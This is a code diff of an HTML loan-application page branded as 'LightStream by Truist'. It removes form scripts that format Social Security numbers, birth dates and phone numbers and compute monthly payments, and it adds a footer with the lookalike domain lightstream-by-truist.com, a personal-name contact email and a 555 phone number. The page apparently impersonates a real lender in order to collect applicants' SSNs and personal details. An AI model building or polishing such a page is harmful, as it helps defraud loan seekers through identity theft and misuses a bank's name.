-                document.getElementById('cartype').required = false;
-                otherInput.style.display = 'none';
-                document.getElementById('otherloantype').required = false;
-            }
-        });
-
-        // Show other reference input when Other is selected
-        document.getElementById('reference').addEventListener('change', function() {
-            const otherRefInput = document.getElementById('otherReferenceInput');
-            
-            if (this.value === 'other') {
-                otherRefInput.style.display = 'block';
-                document.getElementById('otherreference').required = true;
-            } else {
-                otherRefInput.style.display = 'none';
-                document.getElementById('otherreference').required = false;
-            }
-        });
-
-        // Auto-format phone number as XXX-XXX-XXXX
-        document.getElementById('phone').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
-            if (value.length > 10) value = value.slice(0, 10); // Limit to 10 digits
-            
-            let formatted = '';
-            if (value.length > 0) {
-                formatted = value.slice(0, 3);
-            }
-            if (value.length > 3) {
-                formatted += '-' + value.slice(3, 6);
-            }
-            if (value.length > 6) {
-                formatted += '-' + value.slice(6, 10);
-            }
-            
-            e.target.value = formatted;
-        });
-
-        // Auto-format SSN as XXX-XX-XXXX
-        document.getElementById('ssn').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
-            if (value.length > 9) value = value.slice(0, 9); // Limit to 9 digits
-            
-            let formatted = '';
-            if (value.length > 0) {
-                formatted = value.slice(0, 3);
-            }
-            if (value.length > 3) {
-                formatted += '-' + value.slice(3, 5);
-            }
-            if (value.length > 5) {
-                formatted += '-' + value.slice(5, 9);
-            }
-            
-            e.target.value = formatted;
-        });
-
-        // Auto EMI Calculator
-        function calculateEMI() {
-            const loanAmount = parseFloat(document.getElementById('loanamount').value);
-            const tenure = parseFloat(document.getElementById('tenure').value);
-            const annualRate = 9.39; // Fixed interest rate
-            
-            if (loanAmount && tenure && loanAmount >= 3000 && loanAmount <= 100000 && tenure >= 12 && tenure <= 84) {
-                const monthlyRate = annualRate / 12 / 100; // Monthly interest rate
-                const emi = (loanAmount * monthlyRate * Math.pow(1 + monthlyRate, tenure)) / (Math.pow(1 + monthlyRate, tenure) - 1);
-                
-                document.getElementById('monthlypayment').value = '$' + emi.toFixed(2);
-            } else {
-                document.getElementById('monthlypayment').value = '';
-            }
-        }
-
-        // Calculate EMI when loan amount or tenure changes
-        document.getElementById('loanamount').addEventListener('input', calculateEMI);
-        document.getElementById('tenure').addEventListener('input', calculateEMI);
-
-        // Auto-format Date of Birth as MM/DD/YYYY
-        document.getElementById('dob').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
-            if (value.length > 8) value = value.slice(0, 8); // Limit to 8 digits
-            
-            let formatted = '';
-            if (value.length > 0) {
-                formatted = value.slice(0, 2);
-            }
-            if (value.length > 2) {
-                formatted += '/' + value.slice(2, 4);
-            }
-            if (value.length > 4) {
-                formatted += '/' + value.slice(4, 8);
-            }
-            
-            e.target.value = formatted;
-        });
-    </script>
-</div>
+    <!-- Footer -->
+    <footer>
+        <div class="footer-content">
+            <div class="footer-section">
+                <h3>LightStream by Truist</h3>
+                <p>Your trusted financial partner for all your loan needs. Fast approval, competitive rates, and expert support.</p>
+            </div>
+            <div class="footer-section">
+                <h3>Quick Links</h3>
+                <ul>
+                    <li><a href="index.html">Home</a></li>
+                    <li><a href="about.html">About Us</a></li>
+                    <li><a href="apply.html">Apply Now</a></li>
+                    <li><a href="faq.html">FAQ</a></li>
+                    <li><a href="contact.html">Contact</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Loan Types</h3>
+                <ul>
+                    <li><a href="apply.html">Auto Loans</a></li>
+                    <li><a href="apply.html">Home Loans</a></li>
+                    <li><a href="apply.html">Business Loans</a></li>
+                    <li><a href="apply.html">Personal Loans</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Contact Us</h3>
+                <ul>
+                    <li>📧 allen@lightstream-by-truist.com</li>
+                    <li>📞 1-800-555-0199</li>
+                    <li>🌐 lightstream-by-truist.com</li>
+                    <li><a href="terms.html">Terms & Conditions</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>© 2025 LightStream by Truist. All rights reserved.</p>
+        </div>
+    </footer>
 
 </body>
 </html>
